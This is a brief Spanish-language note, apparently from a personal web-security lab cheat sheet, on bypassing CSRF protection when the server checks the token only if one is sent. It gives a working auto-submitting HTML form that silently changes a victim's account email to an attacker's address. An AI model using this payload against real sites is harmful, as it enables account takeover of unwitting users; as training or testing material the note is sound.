# CSRF con validación solo si hay token presente 

Tags: #CSRF #BurpSuite #XSRF   

```bash 
No se necesita el CSRF token de la víctima para poder cambiar el correo ya que al quitarlo de la solicitud por POST no lo solicita o valida 
```

```HTML 
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();     // Hacer que se envie automaticamente 
</script>
```